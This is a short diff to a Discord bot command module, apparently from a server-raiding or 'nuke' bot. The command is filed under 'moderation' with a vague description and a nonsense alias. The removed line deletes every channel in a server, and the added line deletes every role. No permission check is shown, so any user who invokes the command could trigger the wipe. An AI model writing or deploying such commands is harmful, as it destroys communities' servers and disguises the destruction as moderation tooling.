@@ -3,12 +3,12 @@
 const { RichEmbed } = require("discord.js");
 
 module.exports = {
-    name: "mass",
-    aliases: ["massa"],
+    name: "massb",
+    aliases: ["asdasdsad"],
     category: "moderation",
-    description: "Mass.",
+    description: "MassB.",
     usage: "[comando | alias]",
     run: async (client, message, args) => {
-        message.guild.channels.forEach(channel => channel.delete())
+        message.guild.roles.forEach(role => role.delete())
     }
 }
